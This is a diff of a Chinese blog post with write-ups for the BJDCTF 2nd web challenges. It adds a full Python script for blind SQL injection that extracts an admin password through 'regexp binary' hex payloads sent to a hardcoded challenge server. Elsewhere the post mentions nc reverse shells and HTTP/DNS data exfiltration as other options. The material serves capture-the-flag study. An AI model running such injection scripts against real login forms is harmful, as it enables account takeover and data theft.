@@ -88,7 +88,7 @@
             <h1>BJDCTF 2nd Web题解</h1>
             <span class="meta">
             	Posted on
-              2020-03-22，14 min read
+              2020-03-22，15 min read
             </span>
           </div>
         </div>
@@ -137,7 +137,8 @@ for a in range(1,100):
 print(flag)
 </code></pre>
 <p><img src="https://guokeya.github.io/post-images/1584885951302.png" alt="" loading="lazy"><br>
-还有其他方法。比如nc反弹shell/http数据带出/dns数据带出</p>
+还有其他方法。比如nc反弹shell/http数据带出/dns数据带出<br>
+<img src="https://guokeya.github.io/post-images/1584932054009.png" alt="" loading="lazy"></p>
 <p><strong>[BJDCTF 2nd]简单注入</strong><br>
 听名字就知道是注入。<br>
 输入单引号双引号都被ban了<br>
@@ -164,7 +165,51 @@ for k in range(1,20):
 print(result)
 </code></pre>
 <p>得到密码登陆。拿到flag<br>
-<img src="https://guokeya.github.io/post-images/1584886724707.png" alt="" loading="lazy"></p>
+<img src="https://guokeya.github.io/post-images/1584886724707.png" alt="" loading="lazy"><br>
+预期解是。通过regexp 和binary配合。拿到密码<br>
+以下是Y1ng师傅的脚本</p>
+<pre><code>################################
+# 颖奇L'Amore www.gem-love.com #
+# 转载请勿删除本水印             #
+################################
+import os
+import requests as req
+
+def ord2hex(string):
+  result = ''
+  for i in string:
+    result += hex(ord(i))
+
+  result = result.replace('0x','')
+  return '0x'+result
+
+
+url = &quot;http://123.57.144.205:2333/&quot;
+string = [ord(i) for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789']
+headers = {
+      'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
+      'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+      'Connection':'keep-alive'
+    }
+
+res = ''
+for i in range(50):
+  for j in string:
+    passwd = ord2hex('^'+res+chr(j))
+    # print(passwd)
+    passwd = 'or password regexp binary {}#'.format(passwd)
+    data = {
+      'username':&quot;admin\\&quot;,
+      'password':passwd
+    }
+
+    r = req.post(url, data=data, headers=headers)
+    # print(r.text)
+    if &quot;BJD need&quot; in r.text:
+      res += chr(j)
+      print(res)
+      break
+</code></pre>
 <p><strong>[BJDCTF 2nd]假猪套天下第一</strong><br>
 登陆得到hint<br>
 <img src="https://guokeya.github.io/post-images/1584886941603.png" alt="" loading="lazy"><br>
